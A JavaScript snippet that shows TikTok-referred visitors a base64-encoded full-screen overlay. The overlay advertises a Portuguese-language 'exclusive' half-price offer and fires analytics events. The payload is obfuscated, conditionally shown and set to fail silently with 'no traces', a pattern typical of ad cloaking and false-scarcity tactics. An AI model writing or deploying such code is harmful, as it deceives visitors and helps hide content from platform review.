(function() {
    // Verify URL parameter again for security
    const u = new URLSearchParams(window.location.search);
    if (u.get('source') !== 'tiktok') return;
    
    // Additional referrer check
    if (!document.referrer) return;
    
    try {
      const d = atob('PHN0eWxlPgogICAgICBAa2V5ZnJhbWVzIHNsaWRlSW4gewogICAgICAgIGZyb20geyBvcGFjaXR5OiAwOyB0cmFuc2Zvcm06IHNjYWxlKDAuOCk7IH0KICAgICAgICB0byB7IG9wYWNpdHk6IDE7IHRyYW5zZm9ybTogc2NhbGUoMSk7IH0KICAgICAgfQogICAgICBAa2V5ZnJhbWVzIHB1bHNlIHsKICAgICAgICAwJSwgMTAwJSB7IHRyYW5zZm9ybTogc2NhbGUoMSk7IH0KICAgICAgICA1MCUgeyB0cmFuc2Zvcm06IHNjYWxlKDEuMDUpOyB9CiAgICAgIH0KICAgICAgQGtleWZyYW1lcyBib3VuY2UgewogICAgICAgIDAlLCAxMDAlIHsgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDApOyB9CiAgICAgICAgNTAlIHsgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC01cHgpOyB9CiAgICAgIH0KICAgIDwvc3R5bGU+PGRpdiBpZD0idGlrdG9rLXNwZWNpYWwtb3ZlcmxheSIgc3R5bGU9IgogICAgICBwb3NpdGlvbjogZml4ZWQ7IAogICAgICB0b3A6IDA7IAogICAgICBsZWZ0OiAwOyAKICAgICAgd2lkdGg6IDEwMCU7IAogICAgICBoZWlnaHQ6IDEwMCU7IAogICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjMDAwIDAlLCAjZmYwMDUwIDUwJSwgI2ZmNmIzNSAxMDAlKTsgCiAgICAgIGNvbG9yOiB3aGl0ZTsgCiAgICAgIHotaW5kZXg6IDk5OTk5OTsgCiAgICAgIGRpc3BsYXk6IGZsZXg7IAogICAgICBhbGlnbi1pdGVtczogY2VudGVyOyAKICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7IAogICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgICBhbmltYXRpb246IHNsaWRlSW4gMC41cyBlYXNlLW91dDsKICAgICI+CiAgICAgIDxkaXYgc3R5bGU9IgogICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LDI1NSwyNTUsMC4xKTsgCiAgICAgICAgcGFkZGluZzogNTBweDsgCiAgICAgICAgYm9yZGVyLXJhZGl1czogMjVweDsgCiAgICAgICAgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDE1cHgpOyAKICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgbWF4LXdpZHRoOiA1MDBweDsKICAgICAgICBtYXJnaW46IDIwcHg7CiAgICAgICI+CiAgICAgICAgPGgxIHN0eWxlPSJmb250LXNpemU6IDNyZW07IG1hcmdpbi1ib3R0b206IDIwcHg7IGFuaW1hdGlvbjogcHVsc2UgMnMgaW5maW5pdGU7Ij4KICAgICAgICAgIPCfjokgT0ZFUlRBIEVYQ0xVU0lWQSEKICAgICAgICA8L2gxPgogICAgICAgIDxwIHN0eWxlPSJmb250LXNpemU6IDEuM3JlbTsgbWFyZ2luLWJvdHRvbTogMzBweDsgb3BhY2l0eTogMC45OyI+CiAgICAgICAgICBWb2PDqiB2ZWlvIGRvIFRpa1RvayBlIHRlbSBhY2Vzc28gYSB1bWEgb2ZlcnRhIGVzcGVjaWFsIHF1ZSBtYWlzIG5pbmd1w6ltIHbDqiEKICAgICAgICA8L3A+CiAgICAgICAgPGRpdiBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMzBweDsiPgogICAgICAgICAgPGRpdiBzdHlsZT0iZm9udC1zaXplOiAycmVtOyBmb250LXdlaWdodDogYm9sZDsgY29sb3I6ICNmZmZmMDA7Ij41MCUgT0ZGPC9kaXY+CiAgICAgICAgICA8ZGl2IHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IGxpbmUtdGhyb3VnaDsgb3BhY2l0eTogMC43OyI+UiQgMTk3PC9kaXY+CiAgICAgICAgICA8ZGl2IHN0eWxlPSJmb250LXNpemU6IDEuNXJlbTsgZm9udC13ZWlnaHQ6IGJvbGQ7Ij5SJCA5NzwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxidXR0b24gb25jbGljaz0id2luZG93Lm9wZW4oJ2h0dHBzOi8vY2hlY2tvdXQuY29tL29mZXJ0YS10aWt0b2snLCAnX2JsYW5rJykiIAogICAgICAgICAgICAgICAgc3R5bGU9IgogICAgICAgICAgICAgICAgICBwYWRkaW5nOiAyMHB4IDQwcHg7IAogICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjZmYwMDUwOyAKICAgICAgICAgICAgICAgICAgY29sb3I6IHdoaXRlOyAKICAgICAgICAgICAgICAgICAgYm9yZGVyOiBub25lOyAKICAgICAgICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMTVweDsgCiAgICAgICAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlcjsgCiAgICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMS4ycmVtOyAKICAgICAgICAgICAgICAgICAgZm9udC13ZWlnaHQ6IGJvbGQ7IAogICAgICAgICAgICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4zczsKICAgICAgICAgICAgICAgICAgbWFyZ2luOiAxMHB4OwogICAgICAgICAgICAgICAgICBhbmltYXRpb246IGJvdW5jZSAxcyBpbmZpbml0ZTsKICAgICAgICAgICAgICAgICI+CiAgICAgICAgICDwn5qAIFFVRVJPIEEgT0ZFUlRBIQogICAgICAgIDwvYnV0dG9uPgogICAgICAgIDxicj4KICAgICAgICA8YnV0dG9uIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aWt0b2stc3BlY2lhbC1vdmVybGF5JykucmVtb3ZlKCkiIAogICAgICAgICAgICAgICAgc3R5bGU9IgogICAgICAgICAgICAgICAgICBwYWRkaW5nOiAxMHB4IDIwcHg7IAogICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgCiAgICAgICAgICAgICAgICAgIGNvbG9yOiB3aGl0ZTsgCiAgICAgICAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHdoaXRlOyAKICAgICAgICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OyAKICAgICAgICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgICAgICAgICAgICBtYXJnaW4tdG9wOiAxNXB4OwogICAgICAgICAgICAgICAgIj4KICAgICAgICAgIOKclSBGZWNoYXIKICAgICAgICA8L2J1dHRvbj4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj48c2NyaXB0PgogICAgICAvLyBBbmFseXRpY3MgdHJhY2tpbmcgZm9yIFRpa1RvayB2aXNpdG9ycwogICAgICBjb25zb2xlLmxvZygnVGlrVG9rIHZpc2l0b3IgZGV0ZWN0ZWQhJyk7CiAgICAgIAogICAgICAvLyBHb29nbGUgQW5hbHl0aWNzIDQKICAgICAgaWYgKHR5cGVvZiBndGFnICE9PSAndW5kZWZpbmVkJykgewogICAgICAgIGd0YWcoJ2V2ZW50JywgJ3Rpa3Rva19zcGVjaWFsX3ZpZXcnLCB7CiAgICAgICAgICBldmVudF9jYXRlZ29yeTogJ3NwZWNpYWxfb2ZmZXInLAogICAgICAgICAgZXZlbnRfbGFiZWw6ICd0aWt0b2tfZXhjbHVzaXZlJywKICAgICAgICAgIHZhbHVlOiAxCiAgICAgICAgfSk7CiAgICAgIH0KICAgICAgCiAgICAgIC8vIEZhY2Vib29rIFBpeGVsCiAgICAgIGlmICh0eXBlb2YgZmJxICE9PSAndW5kZWZpbmVkJykgewogICAgICAgIGZicSgndHJhY2snLCAnVmlld0NvbnRlbnQnLCB7CiAgICAgICAgICBjb250ZW50X2NhdGVnb3J5OiAnc3BlY2lhbF9vZmZlcicsCiAgICAgICAgICBjb250ZW50X25hbWU6ICd0aWt0b2tfZXhjbHVzaXZlJywKICAgICAgICAgIHNvdXJjZTogJ3Rpa3RvaycKICAgICAgICB9KTsKICAgICAgfQogICAgICAKICAgICAgLy8gQ3VzdG9tIHRyYWNraW5nCiAgICAgIGZldGNoKCcvYXBpL3RyYWNrLXRpa3Rvay12aXNpdG9yJywgewogICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgIGhlYWRlcnM6IHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9LAogICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgIGV2ZW50OiAndGlrdG9rX3NwZWNpYWxfb2ZmZXJfdmlldycsCiAgICAgICAgICB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKSwKICAgICAgICAgIHJlZmVycmVyOiBkb2N1bWVudC5yZWZlcnJlcgogICAgICAgIH0pCiAgICAgIH0pLmNhdGNoKGNvbnNvbGUuZXJyb3IpOwogICAgPC9zY3JpcHQ+');
      const c = decodeURIComponent(escape(d));
      
      const e = document.createElement('div');
      e.innerHTML = c;
      document.body.appendChild(e);
    } catch(e) {
      // Silent fail - no traces
    }
  })();
